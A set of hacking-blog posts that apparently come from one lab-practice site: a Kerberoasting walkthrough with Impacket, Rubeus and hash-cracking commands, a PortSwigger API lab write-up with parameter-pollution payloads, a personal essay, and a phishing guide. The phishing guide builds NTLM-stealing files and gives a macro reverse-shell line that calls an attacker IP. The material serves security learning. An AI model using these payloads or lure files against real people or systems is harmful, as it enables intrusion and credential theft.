[{"content":"Overview I\u0026rsquo;m sure you\u0026rsquo;ve cooked with fire at least once — maybe in your grandma\u0026rsquo;s kitchen, over a campfire on a chilly night, or even on a rugged adventure. But this isn\u0026rsquo;t about roasting marshmallows or perfecting grandma\u0026rsquo;s stew. This is about cooking with a different kind of fire: Kerberoasting.\nForget the deep dives and heavy theories; this is just a no-fluff guide to get hands-on with Kerberoasting, both in Linux and Windows environments. So, grab your hacking tools — it\u0026rsquo;s time to turn up the heat and get cracking!\nJust before we move on, if you need a lab to practice this attack, you can set one up using the resources listed at the end of this blog. Shout out to a great OG in the field onecloudemoji\nSo, What is Kerberoasting??? According to a lot of sources, Kerberoasting isn’t about some secret barbecue recipe — it\u0026rsquo;s a clever technique attackers use to extract service account credentials from a Windows Active Directory environment. But let\u0026rsquo;s not get caught up in fancy definitions or technical jargon. Simply put, Kerberoasting is all about leveraging the way Kerberos authentication works to snatch those valuable hashes — the digital keys that can unlock a treasure trove of access across a network.\nUnlike other attacks, Kerberoasting doesn\u0026rsquo;t require admin privileges, and it can often go unnoticed by traditional defenses. The best part? You can cook up this attack from your attacker machine, quietly grabbing the ingredients (the service tickets) needed to crack the recipe (the NTLM hash) offline at your leisure.\nNow, let’s roll up our sleeves and get cooking! Also here is a typical diagram on how this works if it clicks \\m/.\n[ Attacker Machine ] | | 1. Request Service Ticket (TGS) | for a Service Account | v [ Active Directory Domain Controller ] | (Kerberos Key Distribution Center) | | 2. Responds with Service Ticket (TGS) | Encrypted with Service Account Key v [ Attacker Machine ] | | 3. Extract TGS from Memory | Using Kerberoasting Tool (e.g., Rubeus) | v [ Service Ticket (TGS) Captured ] | | 4. Perform Offline Cracking | of the TGS (Brute-force NTLM Hash) | v [ Cracked NTLM Hash of Service Account ] | | 5. Use Cracked Credentials | to Access Target Service v [ Target Service ] (e.g., SQL Server, File Share) Understanding the Kerberos Hash Types: Know Your Ingredients! Hash Type $krb5tgs$23$*Type 23 RC4 $krb5tgs$18$* Type 18 AES-256 $krb5tgs$17$* Type 17 AES-128 So, What Are These Hash Types?\nType 23 (RC4): This is the classic flavor of Kerberoasting hashes. It\u0026rsquo;s a bit outdated, but many systems still serve it up. Type 23 uses the RC4 encryption algorithm — not the strongest, but still very common, making it a frequent target. It’s like finding a well-aged cheese; you know it’ll crack easier!\nType 18 (AES-256): Now we’re talking premium quality! Type 18 uses AES-256 encryption, one of the strongest out there. Extracting this is like biting into a rare, hard-to-crack nut. It’ll take a lot more effort to break, but the payoff could be worth it.\nType 17 (AES-128): A little less intense than Type 18, but still not your everyday cracker. AES-128 is more secure than RC4 but slightly easier to crack than AES-256. Think of it as a medium-hot sauce — not too mild, not too fiery, but still packs a punch.\nRoasting From Linux When we run tools like GetUserSPNs.py, we\u0026rsquo;re hunting for Service Principal Names (SPNs) that can help us identify accounts with valuable service tickets.\n❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 20:06:40.351723 2024-09-05 08:02:03.710164 So, What Did We Find?\nThe output reveals an SPN for active/CIFS:445 associated with the Administrator account. This tells us that the Administrator is tied to a CIFS (Common Internet File System) service running on port 445. Knowing this, we can now plan our next steps for attacking or enumerating this service.\nWhat If We Found Other SPNs?\nIf we had seen SPNs like */SQL or */HTTP, we’d know that these accounts are associated with SQL or web services, respectively. This is crucial because it informs our strategy:\nSQL SPNs (*/SQL): We could explore connecting directly to a SQL server to query data, exploit SQL-specific vulnerabilities, or even dump credentials. HTTP SPNs (*/HTTP): This indicates web services, which might involve web application attacks, directory traversal, or credential brute-forcing over HTTP. Note that there are other popular SPNs like TERMSRV,WSMAN,RPC,LDAP,SMTP,HOST. By understanding the SPNs in front of us, we can quickly identify the best services to target and craft our next moves.\nNext, By using the -request flag with the GetUserSPNs.py script, we attempt to retrieve the TGS for the targeted service:\n❯ GetUserSPNs.py -dc-ip 10.129.231.107 active.htb/SVC_TGS -request Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 20:06:40.351723 2024-09-05 08:06:51.093868 [-] CCache file is not found. Skipping... $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$91797afd7c953--SNIP-- What\u0026rsquo;s Happening Here?\nThe -request flag is doing the magic by asking the Domain Controller (DC) for a TGS ticket associated with the Administrator account for the CIFS service. The response contains a Kerberos ticket hash in the format $krb5tgs$23$*... — Bingo! This is the jackpot for our Kerberoasting attack. Understanding the Ticket:\nThe output provides a Type 23 Kerberos ticket ($krb5tgs$23$*), which uses RC4 encryption. Since RC4 is relatively weak by today\u0026rsquo;s standards, it becomes an ideal target for offline brute-forcing or dictionary attacks. We can now take this TGS hash and attempt to crack it using popular tools like John the Ripper or Hashcat to potentially retrieve the plaintext password. Roasting From Windows Before diving into the roasting, I always like to list stats first using the Rubeus tool. Why? This helps me see the different encryption types (Type 23, Type 18, Type 17) associated with various accounts and check when the password was last set. It\u0026rsquo;s a good habit for real-world engagements — after all, the fresher the password, the tougher it might be to crack!\nC:\\Users\u0026gt; .\\Rubeus.exe kerberoast /stats ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.1 [*] Action: Kerberoasting [*] Listing statistics about target users, no ticket requests being performed. [*] Target Domain : active.htb [*] Searching path \u0026#39;LDAP://DC.active.htb/DC=active,DC=htb\u0026#39; for \u0026#39;(\u0026amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))\u0026#39; [*] Total kerberoastable users : 1 ------------------------------------- | Supported Encryption Type | Count | ------------------------------------- | RC4_HMAC_DEFAULT | 1 | ------------------------------------- ---------------------------------- | Password Last Set Year | Count | ---------------------------------- | 2018 | 1 | ---------------------------------- As shown above, we don\u0026rsquo;t need the /tgtdeleg or the /rc4opsec switches because we\u0026rsquo;re not targeting specific TGT delegations or looking for RC4 hashes explicitly. Instead, we\u0026rsquo;re keeping it simple and efficient by focusing on what Rubeus reveals:\n------------------------------------- | Supported Encryption Type | Count | ------------------------------------- | RC4_HMAC_DEFAULT | 1 | ------------------------------------- With this output, we know there\u0026rsquo;s only one account using the RC4 encryption type — a prime target for Kerberoasting! By skipping the extra flags, we streamline the process, making our attack quicker and more straightforward. Just the way we like it: minimal ingredients, maximum flavor!\nC:\\Users\u0026gt; .\\Rubeus.exe kerberoast /nowrap ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.1 [*] Action: Kerberoasting [*] NOTICE: AES hashes will be returned for AES-enabled accounts. [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. [*] Target Domain : active.htb [*] Searching path \u0026#39;LDAP://DC.active.htb/DC=active,DC=htb\u0026#39; for \u0026#39;(\u0026amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) \u0026#39; [*] Total kerberoastable users : 1 [*] SamAccountName : Administrator [*] DistinguishedName : CN=Administrator,CN=Users,DC=active,DC=htb [*] ServicePrincipalName : active/CIFS:445 [-] Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute smbexec.py again with -codec and the corresponding codec [*] PwdLastSet : 18/7/2018 10:06:40 �� [*] Supported ETypes : RC4_HMAC_DEFAULT [*] Hash : $krb5tgs$23$*Administrator$active.htb$active/CIFS:445@active.htb*$F5--SNIP-- Note that, while we won\u0026rsquo;t delve deeply into every aspect of this attack, We covered practical methods using tools like Rubeus and getuserspn. Note that these tools offer a variety of options and techniques worth exploring on your own, beyond what we\u0026rsquo;ve touched on here.\nServing Dishes ; Hash Cracking This is a very straight forward one as after obtaining the hashes you still need to decrypt them for later use via authentication, You can clearly not submit a full TGS, as a password when asked right ?? 🤣\n######### Using John-The-Ripper ######### # --wordlist: Specify the path to your wordlist (e.g., rockyou.txt). # hash.txt: The file containing the TGS hash. john --wordlist=/path/to/wordlist.txt hash.txt ######### Using Hashcat ######### # -m 13100: Hash type for Kerberos 5 TGS-REP etype 23 (RC4). # -a 0: Attack mode (0 for dictionary attack). # hash.txt: The file containing your Kerberos TGS hash. # /path/to/wordlist.txt: The path to your wordlist. hashcat -m 13100 -a 0 hash.txt /path/to/wordlist.txt Extras : Fixing Kerberos Clock Skew Too Great Resolved Ever seen the error “Kerberos Clock Skew Too Great” and wondered why your carefully planned attack — or legitimate authentication — isn’t working? This error occurs when there is a significant time difference (typically more than 5 minutes) between the client, server, and the Key Distribution Center (KDC) in a Kerberos environment.\nWhy Does This Happen?\nKerberos relies heavily on time synchronization to prevent replay attacks. If the clocks of the devices involved are out of sync beyond the allowed threshold, authentication requests are rejected with this error. This could be fixed with this simple below commands :\ntimedatectl set-ntp off sudo rdate -n [DC-IP of Target] # -n: use SNTP instead of RFC868 time protocol ######### Reset back to the default once done ######### timedatectl set-ntp on timedatectl status Wrapping Up: The Danger of Kerberoasting Kerberoasting is a potent technique in an attacker’s arsenal. Understanding its risks and maintaining robust security practices are vital to protecting your network and sensitive information.\nAccess to High-Value Accounts: Kerberoasting targets service accounts, often with elevated privileges. Cracking these tickets can lead to full administrative access, allowing attackers to pivot through the network and escalate privileges.\nWeak Encryption is a Weakness: Many environments still use outdated encryption types like RC4 (Type 23). These weaker encryption methods are more susceptible to cracking, making them easier targets for attackers with the right tools and techniques.\nMinimal Effort, High Reward: Once attackers have the Kerberos tickets, cracking them can be straightforward with tools like John the Ripper and Hashcat. This means attackers can potentially gain access without significant effort, exploiting weak spots in the system’s security.\nMitigation Matters: Regularly updating service account passwords and using strong encryption methods are crucial defenses. Monitoring and auditing Kerberos tickets and leveraging tools to detect unusual activity can also help mitigate the risk.\nResources Kerberoasting Blogs From Adsecurity.org Setting Up a Kerberoasting lab by James Hay X Onecloudemoji ","permalink":"http://localhost:1313/hacking/cooking_with_fire/","summary":"Overview I\u0026rsquo;m sure you\u0026rsquo;ve cooked with fire at least once — maybe in your grandma\u0026rsquo;s kitchen, over a campfire on a chilly night, or even on a rugged adventure. But this isn\u0026rsquo;t about roasting marshmallows or perfecting grandma\u0026rsquo;s stew. This is about cooking with a different kind of fire: Kerberoasting.\nForget the deep dives and heavy theories; this is just a no-fluff guide to get hands-on with Kerberoasting, both in Linux and Windows environments.","title":"Cooking With Fire"},{"content":"APIs (Application Programming Interfaces) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website\u0026rsquo;s confidentiality, integrity, and availability. Let dive into this lab dummy walkthrough :)\nExploiting an API endpoint using documentation Objective: To solve the lab, find the exposed API documentation and delete user carlos. You can log in to your own account using the following credentials: wiener:peter.\nLogin in as user wiener and sending a request to burp we have this :\nWe can then start to look for common API endpoints like the following. You can also try to fuzz for the API endpoints using the following wordlist here.\n/api /swagger/index.html /openapi.json Fortunately for me i was able to discover the API endpoint by just making a GET request to /api without fuzzing which returned the API documentation.\nI then made a GET request to retrieve series of account information trying out usernames we have at hand\n[User =\u0026gt; Wiener]\n[User =\u0026gt; Carlos]\n[User =\u0026gt; Administrator ]\nWe can also change the email of a particular user take for example user wiener by using the PATCH request method together with an provided data in JSON format.\nChange request method to POST using burp functionality then manually change POST header to PATCH method. Change content-type to application/json Then use the JSON format to send the data. We can then finally delete the user carlos as requested by changing request method to GET and then changing GET to DELETE manually\nFinding and exploiting an unused API endpoint Objective: To solve the lab, exploit a hidden API endpoint to buy a \u0026ldquo;Lightweight l33t Leather Jacket\u0026rdquo;. You can log in to your own account using the following credentials: wiener:peter.\nAs said by the objective we need to first of all add the item to cart\nAfter moving this item to cart and login in with the given credentials we cannot purchase this item cos\u0026rsquo; we have insufficient funds\nSince i am using burp pro we need to setup jython in other to be able to download some extensions that need this. Download the first file from the given link and import it to burpsuite as shown below in the BApp store.\nWe then need to download two burp extensions by navigating to the burp extender tab :\nWe can use the JS Link Finder BApp to crawl endpoints for sensitive files containing API information. We can use the Content type converter BApp to automatically convert data submitted within requests between XML and JSON. Once downloaded we are good to go, Navigate to Targets \u0026gt; Site map, then click on the targets and select Engagements tools \u0026gt; Find scripts\nThis would pull up all scripts and we can try to see if there are any scripts literally related/can serve as a documentation for the API endpoint.\nSending this to the repeater tab and checking the response we finally found an API endpoint in the following format : ${url.host}/api/products/${encodeURIComponent(productId)}/price\nWe can also attempt to find this hidden API endpoints by crawling the site using burp suite pro feature which should give you the API endpoints\n[API Endpoint Discovered]\nSending this requests to my repeater tab i noticed that the items are judged by their product ID which returns the price for that particular product.\nChanging product ID to 1 we can see the price for the \u0026ldquo;Lightweight \u0026ldquo;l33t\u0026rdquo; Leather Jacket\u0026rdquo; item\nSince there is typically no way to alter our own amount in our wallet we can actually alter the amount of the product changing it to $0.00 🤣.\nGo ahead and right click then select Extensions \u0026gt; Content Type Converter \u0026gt; Convert to JSON, this should change the request method to POST and also add a content-type value to the request\nAs shown below we get the error \u0026ldquo;Method not allowed\u0026rdquo;, well we can use the PATCH request method also as this is accepted by most APIs\nThis successfully changes the price to $0.00\nThen sending a GET request we can see that the product price has been changed to $0.00, sweet. Note that if you get the \u0026ldquo;Unauthorized\u0026rdquo; message then login as user wiener first before doing all of this (if possible you just need the new session key).\nNavigating back to the website we can see that we have successfully reduced the price of this product and can add it to cart now.\nYou should be able to solve the lab now by purchasing the item.\nExploiting a mass assignment vulnerability Objective: To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: wiener:peter.\nThis vulnerability exists do to the fact that -:\nthe application supporting parameters that were never intended to be processed by the developer. For example, if a PATCH request is made to /api/users/ that allows users to update their data with the following result; { \u0026#34;username\u0026#34;: \u0026#34;wiener\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;wiener@example.com\u0026#34;, } A concurrent GET /api/users/123 request returns the following JSON data:\n{ \u0026#34;id\u0026#34;: 123, \u0026#34;name\u0026#34;: \u0026#34;John Doe\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;john@example.com\u0026#34;, \u0026#34;isAdmin\u0026#34;: \u0026#34;false\u0026#34; } This shows that the hidden id and isAdmin parameters are bound to the internal user object, alongside the updated username and email parameters.\nAn attacker can then send a PATCH request with the isAdmin parameter value set to true ;\n{ \u0026#34;username\u0026#34;: \u0026#34;wiener\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;wiener@example.com\u0026#34;, \u0026#34;isAdmin\u0026#34;: true, } For the lab we need to download the Param miner BApp which guesses up to 65,536 param names per request, based on information taken from the scope. I won\u0026rsquo;t be using this though. but it is worth downloading. You can go ahead and the item to cart as requested. (Don\u0026rsquo;t forget to login as user wiener)\nThen intercept the request with burpsuite\nI noticed that after adding the item to cart an API request is made to /api/checkout as shown in the above screenshot.\nForwarding this request to the repeater tab, the response is a JSON data which contains the information about the present item we have in our cart\nDecided to check other request method accepted by this endpoint and as shown below it only accepts POST and GET request methods.\nSo i decided to alter the request first of, by changing the request method to POST (Change request method), Then i used the Content type converter extension we used in the last challenge to change request body to JSON, then copied the whole JSON data we got from the response to our request tab.\nAltering the item_price value to 0, nothing changes because we do not have that certain permission to do so as we can see below we are still getting the INSUFFICIENT_FUNDS error.\nThen i decided to alter the percentage discount value giving our self an 100% discount\n$$ \\text{Discount Percentage} = \\left( \\frac{1337 - 0}{1337} \\right) \\times 100 = 100% $$\nWe should now have the lab solved.\nExploiting server-side parameter pollution in a query string Query syntax characters like #, \u0026amp;, and = can be used to test for this vulnerability An attacker can then observe how the application responds. It is also crucial to URL-encode this characters. Otherwise the front-end application will interpret it as a fragment identifier and it won\u0026rsquo;t be passed to the internal API. Objective: To solve the lab, log in as the administrator and delete carlos.\nFirst of all we start by intercepting the login page cos\u0026rsquo; we have not been given a username neither a password.\nWe can then provide wrong credentials and intercept, sending the request to the repeater tab\nAfter several enumeration figured out there is probably no way in the previous endpoint and started to focus on the /forgot-password endpoint\nadding a parameter with the URL encoded character of \u0026amp; as %26, i figured out that the extra username parameter is not been read at all so specifying wrong input in the first parameter leads to an \u0026ldquo;Invalid Username\u0026rdquo; error\nMean while reversing the case as shown below we have a valid response\nThen i decided to move a step further by adding the # encoded character %23 to the end of the query and we have the error \u0026ldquo;Field not specified\u0026rdquo;\nThen decided to bruteforce this parameter by sending this to the intruder tab and selecting the second parameter as this position point for this attack. The major reason for doing this is because there is an hidden parameter which could be altered if we know it.\nThen navigate to Payloads \u0026gt; Payload Options [Simple list] \u0026gt; Add from list and select \u0026ldquo;Server-side variable names\u0026rdquo; as the wordlist.\nStart the attack and as shown below the length of the response from the \u0026ldquo;field\u0026rdquo; parameter is SUS\nChanging the field value to username we can see that there is a change in the output.\nUsing burp pro crawling feature i was able to find the /static/js/forgotPassword.js endpoint with the following hidden reset_token parameter\nforgotPwdReady(() =\u0026gt; { const queryString = window.location.search; const urlParams = new URLSearchParams(queryString); const resetToken = urlParams.get(\u0026#39;reset-token\u0026#39;); if (resetToken) { window.location.href = `/forgot-password?reset_token=${resetToken}`; } else { const forgotPasswordBtn = document.getElementById(\u0026#34;forgot-password-btn\u0026#34;); forgotPasswordBtn.addEventListener(\u0026#34;click\u0026#34;, displayMsg); } Parsing the resest_token parameter as a value to the field variable, we have a reset token.\nCopied this reset token and went over to the URL specified in the JS file /forgot-password?reset_token=${resetToken} specifying the reset token given which referred me to a page to reset the administrator password \u0026ldquo;admin:admin\u0026rdquo;\nSuccessfully logged in as administrator and deleted the user carlos to complete the challenge\nExploiting server-side parameter pollution in a REST URL Objective: To solve the lab, log in as the administrator and delete carlos.\nREST APIs may place parameter names and values in URL path, rather than the query string.\nFor example requests are made to the following endpoint as:\nGET /edit_profile.php?name=peter This results in the following server-side request:\nGET /api/private/users/peter Just as mentioned in the academy section of this challenge we have to combine path traversal sequences to modify parameters and observe how the application responds.\nFirst of we start by traversing twice and seeing if this application is truly vulnerable as shown below.\nAgain i tried to guess the users path by traversing 3 times which worked as shown below meaning there is correct path like ../../../users/carlos\nTook it a step further again by guessing the field variable just as used in the previous challenge and we could actually read the email field correctly.\nusername=administrator..%2f..%2f..%2fusers%2fcarlos%2ffield%2femail%23\nJust to be sure this parameter actually exists i decided to change the field value to username instead and got the below error talk about the API version.\nStarting to research i came across this blog talking about API versioning and discovered we can traverse 4 times and then start our query with a encoded /v1.... which worked.\nadministrator..%2f..%2f..%2f..%2fv1%2fusers%2fcarlos%2ffield%2fusername%23\nNow we need to find the hidden parameter for the password reset token. I started to look up JS files by using the crawl feature of burpsuite as used in other challenges and came across a JS file located at /static/js/forgotPassword.js which revealed the hidden parameter (passwordResetToken)\nforgotPwdReady(() =\u0026gt; { const queryString = window.location.search; const urlParams = new URLSearchParams(queryString); const resetToken = urlParams.get(\u0026#39;reset-token\u0026#39;); if (resetToken) { window.location.href = `/forgot-password?passwordResetToken=${resetToken}`; } else { const forgotPasswordBtn = document.getElementById(\u0026#34;forgot-password-btn\u0026#34;); forgotPasswordBtn.addEventListener(\u0026#34;click\u0026#34;, displayMsg); } }); Made a request and this was successful as expected we got the reset token value. administrator..%2f..%2f..%2f..%2fv1%2fusers%2fadministrator%2ffield%2fpasswordResetToken%23\nWe can place this value in the following parameter on your browser /forgot-password?passwordResetToken=${resetToken}, which should give you access to a password reset page.\nThen we can login as user administrator and delete the user carlos as requested.\nResources https://hackerone.com/reports/1695454 https://hackerone.com/reports/1218680 https://hackerone.com/reports/1218461 https://hackerone.com/reports/232650 https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPAPI.md https://hackerone.com/reports/1140631 https://hackerone.com/reports/745171 https://hackerone.com/reports/220774 https://medium.com/techiepedia/api-exploitation-business-logic-bug-c176d9df47ee https://github.com/z5jt/API-documentation-Wordlist/ ","permalink":"http://localhost:1313/hacking/api_testing_portswigger/","summary":"APIs (Application Programming Interfaces) enable software systems and applications to communicate and share data. API testing is important as vulnerabilities in APIs may undermine core aspects of a website\u0026rsquo;s confidentiality, integrity, and availability. Let dive into this lab dummy walkthrough :)\nExploiting an API endpoint using documentation Objective: To solve the lab, find the exposed API documentation and delete user carlos. You can log in to your own account using the following credentials: wiener:peter.","title":"API Testing || Attacking REST, Swagger APIs {Portswigger}"},{"content":" Not Your Regular Hacking Blog This isn’t your regular hacking blog. You won\u0026rsquo;t find just the usual tutorials or technical breakdowns here. Instead, consider this a reflection—a look into the life of someone who chose the path less traveled, who found a passion in cybersecurity and hacking, but who also faces the unique challenges and uncertainties that come with it.\nWe often see the highlights, the successes, the exploits, and the wins. But beneath the surface, there\u0026rsquo;s a deeper story—one filled with obstacles, setbacks, and unexpected detours. This is about those moments when things don\u0026rsquo;t go according to plan, when life throws curveballs, and when you find yourself navigating through the unknown, clinging to perseverance and faith.\nBecause where I\u0026rsquo;ve been isn’t where I am going. This journey is more than just commands on a terminal or code on a screen; it\u0026rsquo;s about resilience, growth, and the relentless pursuit of something greater. And that’s the story worth telling.\nA Light in the Dark: The Struggles of Learning It’s easy to feel like an overthinker, the kind of person who stays indoors, reads a lot of books, and finds themselves endlessly contemplating why life is the way it is. There are days when things don’t quite click, when the pieces don’t fit, and when we find ourselves choosing the right thing in the wrong place. So many people possess gifts that simply won’t shine in the environment they are in—a truth that stretches across continents, cultures, and circumstances. There are brilliant minds, capable hands, and eager souls all around us—many right here in my own country—waiting for their chance to bloom.\nSome have the discipline to study for 12 hours straight, but when the electricity goes off, they’re left in the dark, quite literally, and it might be two days before the power returns and they can resume their journey toward knowledge. Others have the materials and the electricity but lack the data to connect, to explore, to learn. And even for those with access, a 3 Mbps connection makes the simplest of tasks—like getting a reverse shell and running a \u0026lsquo;whoami\u0026rsquo; command—feel like an eternity; each delay a reminder of the barriers still to be overcome.\nAnd yet, there’s an undying spirit in these struggles. A quiet determination that pushes one to keep going, to keep reaching, despite the constraints. It reminds me of a saying attributed to Jim Rohn: “If you are not moving forward, then change your location.” It is a call to action, a reminder that sometimes, to unlock our full potential, we must be willing to change our environment, to seek a place where our gifts can shine, where our potential can be realized.\nWhen Opportunity Knocks but the Wi-Fi Fails I once applied for a job and got a response—an opportunity that seemed within reach. The next step was a network test, and just then, my usually reliable internet connection began to act up. It was as if the universe had decided to play a cruel joke. I managed to get the interview rescheduled, hopeful for a second chance since it was a remote role. But before I could even catch my breath, the reschedule was canceled, and I lost that opportunity.\nThese are some of the struggles we face. Sure, everyone has their battles, but most people only share the sunshine—the successes, the moments when everything goes right—leaving us to think it’s always smooth sailing. I’m not sharing this out of pity or for sympathy, but to show the reality behind the scenes… the less glamorous side of chasing dreams in this field.\nPray to God, \u0026ldquo;Sir, please, can you pull me out?\u0026rdquo; Despite these setbacks, I deeply appreciate what life has given me and the way I was raised—in a place where character, discipline, and perseverance are paramount. I\u0026rsquo;ve learned so much from my past employers, for which I am genuinely grateful, and I\u0026rsquo;ve soaked up all the knowledge I could, keeping that mindset of continuous self-growth close to my heart. I find strength in the bonds with my brothers—Nighthawk, Blackanon, Hackyou—and in the community of others who share this journey. I’m grateful to God that things are falling into place for some of us right now. And that\u0026rsquo;s what really matters: looking back at the struggles, realizing how far we\u0026rsquo;ve come, and knowing we’re no longer where we used to be.\nThere’s still so much more in store, and I believe that hard work, combined with the right connections, will eventually put every hustling soul—maybe even every techie in NG, as we like to call it—in the right place.\n","permalink":"http://localhost:1313/hacking/the_unseen_struggles/","summary":"Not Your Regular Hacking Blog This isn’t your regular hacking blog. You won\u0026rsquo;t find just the usual tutorials or technical breakdowns here. Instead, consider this a reflection—a look into the life of someone who chose the path less traveled, who found a passion in cybersecurity and hacking, but who also faces the unique challenges and uncertainties that come with it.\nWe often see the highlights, the successes, the exploits, and the wins.","title":"Where I've Been, Isn't Where I Am Going"},{"content":"Phishing is like fishing with a twist—except instead of catching fish, you\u0026rsquo;re trying to reel in sensitive information. Cybercriminals use cunning tactics to craft emails and websites that look all too real, hoping you\u0026rsquo;ll bite. In this post, we\u0026rsquo;re going to break down the phishing process from the initial bait to the final hook. You\u0026rsquo;ll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.\nIn my simulated lab experiences, I’ve encountered several phishing scenarios that highlight the sophistication of these attacks. From deceptive emails that mimic trusted sources to cleverly disguised phishing websites, these examples offer valuable insights into how attackers operate. Understanding these tactics not only helps in recognizing potential threats but also enhances your ability to defend against them effectively.\nScenario 1 : Linking to Trouble In this scenario, we delve into the art of crafting a seemingly innocent .lnk file, but with a malicious twist. Our approach involves creating a .lnk file designed to exploit vulnerabilities in the Windows environment. We start by creating this file with the following tool called \u0026ldquo;ntlm_theft\u0026rdquo; created by Green Wolf.\n############ Command Breakdown ############## # -g: generate all file formats # -s: IP SMB hash capture server (Responder, smbserver.py) # -f: Base filename without extension python3 ntlm_theft.py -g all -s 10.11.69.221 -f secfortress Once this nefarious file is crafted and uploaded to a shared SMB location, it awaits an unsuspecting victim. When the user interacts with the file, it silently triggers a process that captures and returns their NTLM hash. Before deploying our malicious .lnk file, it’s crucial to ensure that we have the necessary write access to an SMB share, or an alternative method for file transfer such as FTP or IMAP.\nAs demonstrated, ensuring that a user (with malicious intent) has write access to an SMB share is crucial for delivering a valid payload. This access allows the attacker to upload the malicious .lnk file to the share. However, this scenario isn\u0026rsquo;t always straightforward. In some trusted environments, users may be granted extensive privileges, including the ability to upload files to areas that are implicitly trusted. Consequently, files uploaded to these locations are often accepted without scrutiny, making them prime targets for exploitation. This highlights the importance of monitoring and restricting file uploads in trusted areas to mitigate potential risks.\nWe can then intercept this valuable hash, opening the door to further exploitation. This technique highlights the power of seemingly benign files and the critical importance of vigilance against such subtle threats. By understanding and simulating these attacks, you gain insight into the sophisticated methods attackers use to compromise systems and the steps you can take to defend against them.\n❯ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.4.0 To support this project: Github -\u0026gt; https://github.com/sponsors/lgandx Paypal -\u0026gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] --SNIP-- [+] Listening for events... [SMB] NTLMv2-SSP Client : 192.168.165.30 [SMB] NTLMv2-SSP Username : REDACTED\\Tracy.White [SMB] NTLMv2-SSP Hash : Tracy.White::REDACTED:9bbf8934331akipping previously captured hash for REDACTED\\Tracy.White Scenario 2 : Macro Mayhem We’ve seen a surge in VBS macro-based attacks recently, such as CVE-2023-23399 and CVE-2023-28311, which have exploited vulnerabilities in common office software. In this section, we\u0026rsquo;ll provide a quick guide on how to manually generate similar malicious macros. From embedding them into documents using tools like LibreOffice or Microsoft Excel, to executing them on a target system for a potential reverse shell.\nBelow is a short example of crafting a malicious macro in LibreOffice, designed to open a reverse shell to a remote attacker:\nBreaking Down the Macro\nREM ***** BASIC *****: This line denotes the beginning of a macro script written in LibreOffice BASIC, which is a scripting language similar to Visual Basic for Applications (VBA).\nSub Main: Defines the start of the macro subroutine named \u0026ldquo;Main.\u0026rdquo; This is where the script begins execution when triggered.\nshell(...): This command executes a shell command on the target system. Here, it uses the bash shell to initiate a reverse shell connection.\nbash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.158/4444 0\u0026gt;\u0026amp;1': This is the core payload. It runs a bash command that creates an interactive reverse shell, sending input and output to the attacker\u0026rsquo;s IP (192.168.0.158) over TCP port 4444. When executed, it effectively gives the attacker remote control of the target system.\nEnd Sub: Marks the end of the macro subroutine.\nGetting a reverse shell is as simple as sending the malicious .odt file to your unsuspecting colleague who \u0026ldquo;clicks everything,\u0026rdquo; and waiting for them to open it. Once they do, the reverse shell pops on the attacker\u0026rsquo;s listener, as long as the target uses Bash or any Linux OS.\nBy embedding this macro into a document and enticing the target to enable macros upon opening, the attacker can establish a reverse shell, gaining unauthorized access to the target system. This example highlights how easy it is to weaponize common office documents, and it underscores the importance of exercising caution with any files that prompt you to enable macros.\n❯ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 192.168.0.158 33474 bash: cannot set terminal process group (1654): Inappropriate ioctl for device bash: no job control in this shell sec-fortress@Pwn-F0rk-3X3C:~$ whoami whoami sec-fortress Closing the Net! As we close the chapter on phishing, remember that staying one step ahead of cyber criminals is key. From sneaky .lnk files to crafty macros, these attacks exploit human trust and technical vulnerabilities. By understanding these methods, you can better protect yourself and your organization. Always be cautious with unexpected files and links, and never hesitate to verify their legitimacy. With awareness and vigilance, you can turn the tables on these digital predators and keep your information secure. Stay alert, stay informed, and keep phishing at bay!\nTake note that this is based on my experiences in simulated labs, and there are many more phishing techniques out there. The landscape of phishing is constantly evolving, so staying updated and informed is crucial.\nResources Phishing methodology ","permalink":"http://localhost:1313/hacking/phishing_guide/","summary":"Phishing is like fishing with a twist—except instead of catching fish, you\u0026rsquo;re trying to reel in sensitive information. Cybercriminals use cunning 